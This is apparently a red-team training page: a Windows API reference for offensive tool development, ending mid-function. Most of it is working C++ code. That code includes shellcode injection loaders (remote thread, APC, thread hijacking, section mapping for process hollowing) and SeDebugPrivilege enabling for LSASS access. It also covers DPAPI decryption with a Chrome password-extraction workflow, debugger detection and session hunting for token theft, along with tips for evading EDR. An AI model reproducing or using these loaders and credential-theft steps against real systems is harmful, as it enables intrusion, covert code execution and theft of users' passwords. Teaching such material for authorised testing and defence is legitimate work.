---
layout: training-page
title: "Windows API Reference for Red Team — Red Team Academy"
module: "Tool Development"
tags:
  - windows-api
  - process-injection
  - c-plus-plus
  - tool-dev
  - shellcode
  - token-manipulation
  - process-memory
page_key: "tool-dev-windows-api-reference"
render_with_liquid: false
---

# Windows API Reference for Red Team

Core Windows APIs used in offensive tool development, process injection, credential access, and post-exploitation. Each API below includes its red team use case, required access rights, and a functional C++ code example.

## Process Enumeration

### CreateToolhelp32Snapshot — List Running Processes

Takes a snapshot of running processes and their modules. Used to enumerate all processes for target selection, parent process spoofing, or finding injection targets.

```
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

int main() {
    // Snapshot all running processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 1;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            std::cout << "PID: " << pe32.th32ProcessID
                      << "  Parent: " << pe32.th32ParentProcessID
                      << "  Name: " << pe32.szExeFile << std::endl;
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0;
}
// Flags: TH32CS_SNAPPROCESS | TH32CS_SNAPMODULE | TH32CS_SNAPTHREAD
```

### GetModuleFileName — Get Executable Path by PID

Retrieves the full path of a process's executable. Useful for confirming injection targets or enumerating loaded DLLs.

```
#include <windows.h>
#include <psapi.h>
#include <iostream>

// Compile with: /link psapi.lib
int main() {
    DWORD processId = 1234; // Target PID

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                                   FALSE, processId);
    if (hProcess == NULL) return 1;

    char szPath[MAX_PATH];
    if (GetModuleFileNameExA(hProcess, NULL, szPath, MAX_PATH))
        std::cout << "Path: " << szPath << std::endl;

    CloseHandle(hProcess);
    return 0;
}
```

## Process Handle Operations

### OpenProcess — Get Handle to Target Process

Opens an existing process and returns a handle. The handle's capabilities depend on the requested access rights. This is the first step for almost all process injection techniques.

```
#include <windows.h>

// Required access rights for common operations:
// PROCESS_ALL_ACCESS          — all rights (most detectable)
// PROCESS_VM_READ             — ReadProcessMemory
// PROCESS_VM_WRITE            — WriteProcessMemory
// PROCESS_VM_OPERATION        — VirtualAllocEx, VirtualProtectEx
// PROCESS_CREATE_THREAD       — CreateRemoteThread
// PROCESS_QUERY_INFORMATION   — GetTokenInformation, GetModuleFileName
// PROCESS_DUP_HANDLE          — DuplicateHandle

HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION
                               | PROCESS_CREATE_THREAD, FALSE, targetPid);
// OPSEC: PROCESS_ALL_ACCESS is loudly flagged by EDR.
// Request only the specific rights needed for the operation.
```

### DuplicateHandle — Clone Process/Thread Handle

Duplicates a handle from one process to another. Used for handle theft attacks — steal a high-privilege handle from another process without OpenProcess.

```
#include <windows.h>
#include <iostream>

int main() {
    HANDLE hSource = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE,
                                  GetCurrentProcessId());

    HANDLE hDuplicate = NULL;
    if (DuplicateHandle(
            GetCurrentProcess(),    // Source process
            hSource,                // Source handle
            GetCurrentProcess(),    // Target process
            &hDuplicate,           // Output duplicate
            0,                      // Access (0 = same as source)
            FALSE,
            DUPLICATE_SAME_ACCESS)) {
        std::cout << "Duplicated handle: " << hDuplicate << std::endl;
        CloseHandle(hDuplicate);
    }

    CloseHandle(hSource);
    return 0;
}
```

## Process Memory Manipulation

### ReadProcessMemory — Read Another Process's Memory

Reads memory from a target process. Used to extract credentials from LSASS, read loaded modules, or inspect process state.

```
#include <windows.h>
#include <iostream>

int main() {
    DWORD targetPid = 1234;

    HANDLE hProcess = OpenProcess(PROCESS_VM_READ, FALSE, targetPid);
    if (hProcess == NULL) return 1;

    DWORD address = 0x12345678; // Target memory address
    DWORD buffer = 0;
    SIZE_T bytesRead = 0;

    if (ReadProcessMemory(hProcess, (LPCVOID)address, &buffer,
                          sizeof(DWORD), &bytesRead))
        std::cout << "Value at " << std::hex << address
                  << ": " << std::dec << buffer << std::endl;

    CloseHandle(hProcess);
    return 0;
}
```

### WriteProcessMemory — Write to Another Process's Memory

Writes data to a target process's memory. Required for all injection techniques that plant shellcode or DLL paths in a remote process.

```
#include <windows.h>
#include <iostream>

int main() {
    DWORD targetPid = 1234;

    // Need PROCESS_VM_WRITE + PROCESS_VM_OPERATION
    HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
                                   FALSE, targetPid);
    if (hProcess == NULL) return 1;

    LPVOID targetAddress = (LPVOID)0x12345678;
    DWORD value = 42;
    SIZE_T bytesWritten = 0;

    WriteProcessMemory(hProcess, targetAddress, &value,
                       sizeof(DWORD), &bytesWritten);

    CloseHandle(hProcess);
    return 0;
}
```

### VirtualAllocEx — Allocate Memory in Remote Process

Allocates a memory region in a target process. The first step in shellcode injection — allocate RWX (or RW→RX) memory to write shellcode into.

```
#include <windows.h>
#include <iostream>

int main() {
    DWORD targetPid = 1234;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (hProcess == NULL) return 1;

    SIZE_T shellcodeSize = 4096;

    // Allocate RWX memory — detectable. Prefer RW first, then flip to RX.
    LPVOID pRemote = VirtualAllocEx(hProcess,
                                     NULL,              // Any address
                                     shellcodeSize,
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_EXECUTE_READWRITE);

    if (pRemote)
        std::cout << "Allocated at: " << pRemote << std::endl;

    // Write shellcode with WriteProcessMemory, then execute
    // ...

    VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return 0;
}
// PAGE flags: PAGE_READWRITE (0x04) → flip to PAGE_EXECUTE_READ (0x20)
// Use VirtualProtectEx to change protection after writing
```

### VirtualProtectEx — Change Memory Permissions

Changes the protection attributes of memory in a remote process. Use this to write shellcode as RW, then flip to RX — avoids allocating RWX regions which EDR flags heavily.

```
#include <windows.h>

// Stealth shellcode injection pattern (RW → RX):
// Step 1: Allocate RW (no execute)
LPVOID pMem = VirtualAllocEx(hProcess, NULL, shellcodeSize,
                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

// Step 2: Write shellcode
WriteProcessMemory(hProcess, pMem, shellcode, shellcodeSize, NULL);

// Step 3: Flip to RX (remove write, add execute)
DWORD oldProtect;
VirtualProtectEx(hProcess, pMem, shellcodeSize,
                  PAGE_EXECUTE_READ, &oldProtect);

// Step 4: Execute via CreateRemoteThread / QueueUserAPC
```

## Code Injection Techniques

### CreateRemoteThread — Classic Shellcode Injection

Creates a thread in a remote process, executing at a specified address. The most classic injection technique — widely detected, but still works against unsophisticated defenses.

```
#include <windows.h>
#include <iostream>

// Full classic injection: alloc → write → execute
int InjectShellcode(DWORD targetPid, BYTE* shellcode, SIZE_T shellcodeSize) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) return 1;

    // Allocate RW memory
    LPVOID pRemote = VirtualAllocEx(hProcess, NULL, shellcodeSize,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemote) { CloseHandle(hProcess); return 1; }

    // Write shellcode
    WriteProcessMemory(hProcess, pRemote, shellcode, shellcodeSize, NULL);

    // Flip to RX
    DWORD oldProt;
    VirtualProtectEx(hProcess, pRemote, shellcodeSize, PAGE_EXECUTE_READ, &oldProt);

    // Spawn remote thread at shellcode address
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                       (LPTHREAD_START_ROUTINE)pRemote, NULL, 0, NULL);

    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return 0;
}
// OPSEC: CreateRemoteThread is heavily monitored. Prefer APC injection.
```

### QueueUserAPC — APC Shellcode Injection

Queues an Asynchronous Procedure Call (APC) to execute within an alertable thread. Stealthier than CreateRemoteThread because no new thread is created — code executes in an existing thread context.

```
#include <windows.h>
#include <iostream>

// APC injection — requires an alertable thread in the target process
// Alertable threads: SleepEx, WaitForSingleObjectEx, MsgWaitForMultipleObjectsEx

VOID CALLBACK APCProc(ULONG_PTR dwParam) {
    // Code runs in target thread context
}

int main() {
    DWORD targetPid = 1234;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) return 1;

    // Allocate and write shellcode (same as CreateRemoteThread pattern)
    LPVOID pRemote = VirtualAllocEx(hProcess, NULL, shellcodeSize,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProcess, pRemote, shellcode, shellcodeSize, NULL);
    DWORD oldProt;
    VirtualProtectEx(hProcess, pRemote, shellcodeSize, PAGE_EXECUTE_READ, &oldProt);

    // Get thread handle from target process (enumerate threads with CreateToolhelp32Snapshot)
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetThreadId);

    // Queue APC to run at shellcode address when thread enters alertable state
    QueueUserAPC((PAPCFUNC)pRemote, hThread, 0);

    // Force thread into alertable state by suspending and resuming
    SuspendThread(hThread);
    ResumeThread(hThread);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
// See: evasion/apc-injection.html for full APC early-bird technique
```

### SetThreadContext — Thread Hijacking

Suspends a thread and redirects its instruction pointer (RIP/EIP) to shellcode. No new thread is created — executes shellcode inside an existing legitimate thread.

```
#include <windows.h>
#include <iostream>

// Thread hijacking — redirect RIP to shellcode
int HijackThread(DWORD targetTid, LPVOID shellcodeAddr) {
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetTid);
    if (!hThread) return 1;

    // Suspend the target thread
    SuspendThread(hThread);

    // Get current context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);

    // Save original RIP for cleanup, redirect to shellcode
#ifdef _WIN64
    ctx.Rip = (DWORD64)shellcodeAddr;
#else
    ctx.Eip = (DWORD)shellcodeAddr;
#endif

    // Apply modified context
    SetThreadContext(hThread, &ctx);

    // Resume — thread now executes at shellcode address
    ResumeThread(hThread);

    CloseHandle(hThread);
    return 0;
}
// OPSEC: Suspend+Resume generates events. Consider targeting sleeping threads.
```

## Token Manipulation

### OpenProcessToken — Access Process Token

Opens the access token associated with a process. Required before reading, duplicating, or modifying process privileges.

```
#include <windows.h>
#include <iostream>

int main() {
    DWORD targetPid = 1234;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
    if (!hProcess) return 1;

    HANDLE hToken = NULL;
    // TOKEN_QUERY for reading, TOKEN_ADJUST_PRIVILEGES for modification
    // TOKEN_DUPLICATE for impersonation
    if (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
        // Use hToken for GetTokenInformation, AdjustTokenPrivileges, etc.
        CloseHandle(hToken);
    }

    CloseHandle(hProcess);
    return 0;
}
```

### GetTokenInformation — Read Token Privileges & Groups

Retrieves information from an access token — groups, privileges, integrity level, and more. Use for privilege enumeration and impersonation target selection.

```
#include <windows.h>
#include <iostream>

int main() {
    HANDLE hToken = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);

    // Get token groups
    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenGroups, NULL, 0, &dwSize);
    PTOKEN_GROUPS pGroups = (PTOKEN_GROUPS)new BYTE[dwSize];
    GetTokenInformation(hToken, TokenGroups, pGroups, dwSize, &dwSize);

    for (DWORD i = 0; i < pGroups->GroupCount; i++) {
        WCHAR szName[256]; DWORD cch = 256;
        SID_NAME_USE sidType;
        if (LookupAccountSidW(NULL, pGroups->Groups[i].Sid, szName, &cch, NULL, NULL, &sidType))
            std::wcout << L"Group: " << szName << std::endl;
    }

    // Also useful: TokenPrivileges, TokenElevation, TokenIntegrityLevel
    delete[] pGroups;
    CloseHandle(hToken);
    return 0;
}
```

### AdjustTokenPrivileges — Enable SeDebugPrivilege

Enables or disables privileges in an access token. `SeDebugPrivilege` allows opening handles to any process (including SYSTEM), enabling LSASS memory access. Must hold the privilege first (admin shell).

```
#include <windows.h>
#include <iostream>

bool EnablePrivilege(LPCSTR privName) {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    LUID luid;
    if (!LookupPrivilegeValueA(NULL, privName, &luid)) {
        CloseHandle(hToken); return false;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    bool success = (GetLastError() != ERROR_NOT_ALL_ASSIGNED);

    CloseHandle(hToken);
    return success;
}

int main() {
    // Enable debug privilege — allows OpenProcess on LSASS
    if (EnablePrivilege(SE_DEBUG_NAME))
        std::cout << "SeDebugPrivilege enabled" << std::endl;

    // Other useful privileges:
    // SE_IMPERSONATE_NAME     — impersonate tokens
    // SE_ASSIGNPRIMARYTOKEN_NAME — assign primary token
    // SE_TCB_NAME            — act as OS (SYSTEM)
    return 0;
}
```

## DLL Loading & Execution

### GetProcAddress — Resolve API Addresses at Runtime

Retrieves the address of an exported function from a DLL. Used to dynamically resolve API calls at runtime, bypassing static import table analysis by security tools.

```
#include <windows.h>
#include <iostream>

int main() {
    // Load DLL and resolve function pointer dynamically
    HMODULE hModule = LoadLibraryA("user32.dll");
    if (!hModule) return 1;

    // Get address of MessageBoxA
    FARPROC pFunc = GetProcAddress(hModule, "MessageBoxA");
    if (pFunc) {
        // Cast and call the function
        typedef int(WINAPI* MsgBoxFn)(HWND, LPCSTR, LPCSTR, UINT);
        MsgBoxFn pMsgBox = (MsgBoxFn)pFunc;
        pMsgBox(NULL, "Resolved dynamically", "Test", MB_OK);
    }

    FreeLibrary(hModule);
    return 0;
}
// OPSEC: Resolving from PEB (GetModuleHandle) avoids LoadLibrary telemetry.
// Also useful: GetProcAddress with ordinals instead of names (evasion)
// GetProcAddress(hMod, (LPCSTR)1) — resolve by ordinal 1
```

### CreateProcessA — Spawn Process with Custom Flags

Creates a new process. Supports process creation flags for PPID spoofing, suspended state (for early-bird injection), hidden windows, and process attribute manipulation.

```
#include <windows.h>
#include <iostream>

int main() {
    STARTUPINFOA si = {0};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;   // Hide window

    PROCESS_INFORMATION pi = {0};

    // Create process suspended (for early-bird APC injection)
    CreateProcessA(
        NULL,                       // Application name
        (LPSTR)"C:\\Windows\\System32\\svchost.exe",
        NULL, NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,  // Suspended for injection
        NULL, NULL,
        &si, π
    );

    std::cout << "PID: " << pi.dwProcessId << std::endl;

    // Inject shellcode into pi.hProcess, then ResumeThread(pi.hThread)

    // Or just resume immediately
    ResumeThread(pi.hThread);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
// Flags: CREATE_SUSPENDED | CREATE_NO_WINDOW | DETACHED_PROCESS
// For PPID spoofing: use UpdateProcThreadAttribute with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
```

## Injection Technique Comparison

```
Technique            | New Thread | EDR Noise | Alertable Thread Required
CreateRemoteThread   | Yes        | Very High | No
QueueUserAPC         | No         | Medium    | Yes (Early-Bird: No)
SetThreadContext     | No         | Medium    | No (Thread Hijacking)
NtCreateThreadEx     | Yes        | High      | No (direct syscall version is lower)
Thread Pool Injection| No         | Low       | No (RtpWorkItemCallback)

Classic injection pipeline:
OpenProcess → VirtualAllocEx → WriteProcessMemory → VirtualProtectEx → Execute
```

## Compilation

```
# MSVC
cl.exe /nologo /W0 injector.cpp /link /OUT:injector.exe

# MinGW (Linux cross-compile for Windows)
x86_64-w64-mingw32-g++ -o injector.exe injector.cpp -lpsapi

# With specific libs
x86_64-w64-mingw32-g++ -o injector.exe injector.cpp -lpsapi -lwtsapi32

# Cross-compile DLL
x86_64-w64-mingw32-g++ --shared -o payload.dll payload.cpp
```

## Thread Context Manipulation

### GetThreadContext / SetThreadContext — Process Hollowing & Thread Hijacking

Reads and modifies the CPU register state of a suspended thread. Used to redirect execution to injected shellcode by changing the instruction pointer (RIP on x64, EIP on x86).

```cpp
#include <Windows.h>
#include <iostream>

int main() {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Create target process in SUSPENDED state
    CreateProcessW(L"C:\\Windows\\System32\\notepad.exe",
                   NULL, NULL, NULL, FALSE,
                   CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    // Allocate and write shellcode into target process
    BYTE shellcode[] = { 0x90, 0x90, 0xC3 };   // NOP NOP RET (replace with real payload)
    LPVOID pShellcode = VirtualAllocEx(pi.hProcess, NULL,
                                       sizeof(shellcode),
                                       MEM_COMMIT | MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, pShellcode,
                       shellcode, sizeof(shellcode), NULL);

    // Get current thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    std::cout << "Original RIP: 0x" << std::hex << ctx.Rip << "\n";

    // Redirect RIP to our shellcode
    ctx.Rip = (DWORD64)pShellcode;
    SetThreadContext(pi.hThread, &ctx);

    // Resume — thread now executes our shellcode first
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
// Access rights needed: THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME
// Thread must be suspended before calling GetThreadContext for reliable results
// x64 uses RIP, x86 uses EIP; 32-bit threads on 64-bit OS need Wow64GetThreadContext
```

**Red team uses:** Process hollowing (modify primary thread RIP), thread stomping (hijack benign thread), shellcode launcher (create suspended dummy thread, set context, resume). Detected as: suspended thread + RIP modified + RWX allocation.

## DPAPI Credential Decryption

### CryptUnprotectData — Decrypt Browser Passwords, Wi-Fi Keys, RDP Credentials

Decrypts data previously encrypted with `CryptProtectData` (Windows DPAPI). Used by Chrome, Edge, Credential Manager, WLAN profiles, and many applications to protect secrets on disk.

```cpp
#include <windows.h>
#include <wincrypt.h>
#include <iostream>
#include <vector>
#pragma comment(lib, "crypt32.lib")

// Decrypt a DPAPI-encrypted blob
bool DpapiDecrypt(const BYTE* encData, DWORD encSize) {
    DATA_BLOB inBlob  = { encSize, const_cast<BYTE*>(encData) };
    DATA_BLOB outBlob = { 0, nullptr };

    if (CryptUnprotectData(
            &inBlob,     // Encrypted input
            NULL,        // Optional description (out)
            NULL,        // Optional entropy (must match CryptProtectData call)
            NULL,        // Reserved
            NULL,        // Prompt struct (NULL = silent)
            0,           // Flags
            &outBlob))   // Decrypted output
    {
        std::cout << "[+] Decrypted (" << outBlob.cbData << " bytes): ";
        for (DWORD i = 0; i < outBlob.cbData; i++)
            std::cout << (char)outBlob.pbData[i];
        std::cout << "\n";
        LocalFree(outBlob.pbData);
        return true;
    }
    std::cerr << "[-] CryptUnprotectData failed: " << GetLastError() << "\n";
    return false;
}

// Chrome password extraction workflow:
// 1. Open: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data (SQLite)
// 2. SELECT password_value FROM logins
// 3. Pass blob to DpapiDecrypt() → cleartext password
```

**Red team use cases:**

| Target | Details |
|---|---|
| Chrome/Edge passwords | `Login Data` SQLite → `password_value` blob → `CryptUnprotectData` |
| Wi-Fi keys | `%ProgramData%\Microsoft\Wlansvc\Profiles\` → XML → DPAPI blob |
| RDP credentials | Windows Credential Manager → `CryptUnprotectData` |
| LSA secrets | Requires SYSTEM + registry hive dump (SECURITY + SYSTEM) |

**OPSEC:** Calling from correct user context is required; DPAPI keys are user/machine-specific. Low detection risk alone — high risk when combined with SQLite browser reads.

## Native Memory Section Mapping

### NtMapViewOfSection / NtUnmapViewOfSection — Process Hollowing, Reflective DLL

Low-level NT APIs to map/unmap section objects (shared memory, file-backed images) into a process's address space. Used to implement process hollowing and reflective DLL injection without calling `VirtualAllocEx`/`WriteProcessMemory` (high-detection triad).

```cpp
#include <windows.h>
#include <winternl.h>
#include <iostream>

// Load NtMapViewOfSection / NtUnmapViewOfSection dynamically
typedef NTSTATUS(NTAPI* NtMapViewOfSection_t)(
    HANDLE SectionHandle, HANDLE ProcessHandle,
    PVOID* BaseAddress, ULONG_PTR ZeroBits,
    SIZE_T CommitSize, PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize, DWORD InheritDisposition,
    ULONG AllocationType, ULONG Win32Protect
);
typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_t)(
    HANDLE ProcessHandle, PVOID BaseAddress
);
typedef NTSTATUS(NTAPI* NtCreateSection_t)(
    PHANDLE SectionHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection, ULONG AllocationAttributes,
    HANDLE FileHandle
);

int main() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    auto NtMap   = (NtMapViewOfSection_t)  GetProcAddress(hNtdll, "NtMapViewOfSection");
    auto NtUnmap = (NtUnmapViewOfSection_t)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    auto NtCreate = (NtCreateSection_t)    GetProcAddress(hNtdll, "NtCreateSection");

    // Create a section backed by the page file (anonymous shared memory)
    HANDLE hSection = nullptr;
    LARGE_INTEGER maxSize = { .QuadPart = 0x1000 };    // 4 KB
    NtCreate(&hSection, SECTION_ALL_ACCESS, nullptr,
             &maxSize, PAGE_EXECUTE_READWRITE,
             SEC_COMMIT, nullptr);

    // Map into current process (for writing shellcode)
    PVOID localBase = nullptr;
    SIZE_T viewSize = 0;
    NtMap(hSection, GetCurrentProcess(),
          &localBase, 0, 0, nullptr, &viewSize,
          1, 0, PAGE_READWRITE);

    // Write payload
    BYTE payload[] = { 0x90, 0xC3 };   // NOP RET
    memcpy(localBase, payload, sizeof(payload));

    // Map same section into remote process (shared memory — no WriteProcessMemory!)
    HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, /* target PID */ 1234);
    PVOID  remoteBase = nullptr;
    viewSize = 0;
    NtMap(hSection, hTarget,
          &remoteBase, 0, 0, nullptr, &viewSize,
          1, 0, PAGE_EXECUTE_READ);

    std::cout << "[+] Payload mapped at " << remoteBase << " in target process\n";

    CloseHandle(hSection);
    CloseHandle(hTarget);
    return 0;
}
// Use case: Process hollowing replaces the unmapped .text section of a
// suspended process with a new section containing the payload.
// NtUnmapViewOfSection first removes the original image mapping.
```

**Use cases:** Process hollowing (`NtUnmapViewOfSection` on suspended process → remap payload), reflective DLL loading (map DLL manually instead of via `LoadLibrary`), NTDLL unhooking (map clean copy of ntdll from disk).

## Service Enumeration

### EnumServicesStatusEx — Discover Misconfigured / Privilege-Escalation Services

Enumerates all installed services, returning their names, display names, current state, and process IDs. Critical for discovering `SYSTEM`-level services with weak permissions.

```cpp
#include <windows.h>
#include <iostream>
#pragma comment(lib, "advapi32.lib")

void EnumServices() {
    // Open Service Control Manager
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!hSCM) {
        std::cerr << "[-] OpenSCManager failed: " << GetLastError() << "\n";
        return;
    }

    DWORD bytesNeeded = 0, servicesReturned = 0, resumeHandle = 0;

    // First call: get required buffer size
    EnumServicesStatusEx(hSCM, SC_ENUM_PROCESS_INFO,
                         SERVICE_WIN32, SERVICE_STATE_ALL,
                         nullptr, 0, &bytesNeeded,
                         &servicesReturned, &resumeHandle, nullptr);

    std::vector<BYTE> buf(bytesNeeded);

    // Second call: fill buffer
    if (!EnumServicesStatusEx(hSCM, SC_ENUM_PROCESS_INFO,
                              SERVICE_WIN32, SERVICE_STATE_ALL,
                              buf.data(), bytesNeeded, &bytesNeeded,
                              &servicesReturned, &resumeHandle, nullptr)) {
        std::cerr << "[-] EnumServicesStatusEx failed\n";
        CloseServiceHandle(hSCM);
        return;
    }

    auto* entries = (ENUM_SERVICE_STATUS_PROCESS*)buf.data();
    for (DWORD i = 0; i < servicesReturned; i++) {
        auto& e = entries[i];
        auto state = e.ServiceStatusProcess.dwCurrentState;
        auto pid   = e.ServiceStatusProcess.dwProcessId;
        std::wcout << L"[" << (state == SERVICE_RUNNING ? L"RUN" : L"STP") << L"] "
                   << e.lpServiceName
                   << L"  PID=" << pid << L"\n";
    }

    CloseServiceHandle(hSCM);
}
// Privesc targets: services running as SYSTEM with weak binary or directory permissions
// Follow-up: sc qc <service_name> → check BINARY_PATH_NAME for unquoted paths
```

## Anti-Debugging via NtQueryInformationProcess

### NtQueryInformationProcess — PEB, Debug Port, Parent PID

Queries internal process metadata. Widely used for sandbox detection (checking for debugger attachment via `ProcessDebugPort`) and parent process spoofing (reading `InheritedFromUniqueProcessId`).

```cpp
#include <Windows.h>
#include <winternl.h>
#include <iostream>

// Custom struct — avoids SDK conflicts
typedef struct _MY_PBI {
    PVOID    Reserved1;
    PPEB     PebBaseAddress;
    PVOID    Reserved2[2];
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} MY_PBI;

typedef NTSTATUS(NTAPI* NtQIP_t)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

int main() {
    auto NtQIP = (NtQIP_t)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

    HANDLE hSelf = GetCurrentProcess();

    // 1. Get PEB address and parent PID
    MY_PBI pbi = {};
    NtQIP(hSelf, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
    std::cout << "PEB:        " << pbi.PebBaseAddress << "\n";
    std::cout << "PID:        " << pbi.UniqueProcessId << "\n";
    std::cout << "Parent PID: " << pbi.InheritedFromUniqueProcessId << "\n";

    // 2. Check for debugger via ProcessDebugPort (= 0 if not debugged)
    DWORD_PTR debugPort = 0;
    NtQIP(hSelf, (PROCESSINFOCLASS)7 /*ProcessDebugPort*/,
          &debugPort, sizeof(debugPort), nullptr);
    std::cout << "DebugPort:  " << debugPort
              << (debugPort ? "  [DEBUGGER DETECTED]" : "  [clean]") << "\n";

    // 3. Get full image path (ProcessImageFileName = 27)
    WCHAR imgBuf[512] = {};
    NtQIP(hSelf, (PROCESSINFOCLASS)27, imgBuf, sizeof(imgBuf), nullptr);
    auto* ustr = (UNICODE_STRING*)imgBuf;
    std::wcout << L"Image: " << ustr->Buffer << L"\n";

    return 0;
}
// ProcessDebugPort != 0  →  debugger attached  →  exit or fake behavior
// ProcessBasicInformation.InheritedFromUniqueProcessId  →  detect analysis tools
//   by comparing parent to expected (e.g., explorer.exe)
```

## Logon Session Enumeration

### LsaEnumerateLogonSessions / LsaGetLogonSessionData — Session Hunting

Enumerates all active logon sessions on the system. Returns username, domain, logon type (interactive, remote, service), auth package, and logon time. Used to identify privileged sessions for token theft.

```cpp
#include <windows.h>
#include <ntsecapi.h>
#include <iostream>
#pragma comment(lib, "secur32.lib")

void EnumLogonSessions() {
    ULONG  count = 0;
    PLUID  luids = nullptr;

    if (LsaEnumerateLogonSessions(&count, &luids) != 0) {
        std::cerr << "[-] LsaEnumerateLogonSessions failed\n";
        return;
    }

    std::cout << "[+] " << count << " logon sessions:\n";

    for (ULONG i = 0; i < count; i++) {
        PSECURITY_LOGON_SESSION_DATA data = nullptr;
        if (LsaGetLogonSessionData(&luids[i], &data) != 0 || !data)
            continue;

        // Logon types: 2=Interactive, 3=Network, 4=Batch, 5=Service, 10=RemoteInteractive(RDP)
        static const char* logonTypes[] = {
            "", "", "Interactive", "Network", "Batch",
            "Service", "", "", "", "", "RemoteInteractive"
        };
        ULONG lt = data->LogonType;
        const char* ltStr = (lt <= 10) ? logonTypes[lt] : "Unknown";

        std::wcout << L"  LUID: " << luids[i].HighPart << L":" << luids[i].LowPart
                   << L"  User: " << data->UserName.Buffer
                   << L"@" << data->Domain.Buffer
                   << L"  Type: " << ltStr << L"\n";

        LsaFreeReturnBuffer(data);
    }

    LsaFreeReturnBuffer(luids);
}
// Post-exploitation use: find RDP (RemoteInteractive) or domain admin sessions
// for impersonation via DuplicateToken + ImpersonateLoggedOnUser
```

## Network Session & User Enumeration

### NetSessionEnum — Active SMB Sessions

```cpp
#include <windows.h>
#include <lm.h>
#include <iostream>
#pragma comment(lib, "netapi32.lib")

void EnumSMBSessions() {
    SESSION_INFO_10* buf = nullptr;
    DWORD read = 0, total = 0, resume = 0;
    NET_API_STATUS ret;

    do {
        ret = NetSessionEnum(NULL, NULL, NULL, 10,
                             (LPBYTE*)&buf, MAX_PREFERRED_LENGTH,
                             &read, &total, &resume);
        if (ret == NERR_Success || ret == ERROR_MORE_DATA) {
            for (DWORD i = 0; i < read; i++) {
                std::wcout << L"  Client: " << buf[i].sesi10_cname
                           << L"  User: "  << buf[i].sesi10_username
                           << L"  Time: "  << buf[i].sesi10_time << L"s\n";
            }
            NetApiBufferFree(buf);
            buf = nullptr;
        }
    } while (ret == ERROR_MORE_DATA);
}
```

### NetUserEnum — Local / Domain User Accounts

```cpp
void EnumUsers(LPCWSTR server = NULL) {
    USER_INFO_1* buf = nullptr;
    DWORD read = 0, total = 0, resume = 0;
    NET_API_STATUS ret;

    do {
        ret = NetUserEnum(server, 1, FILTER_NORMAL_ACCOUNT,
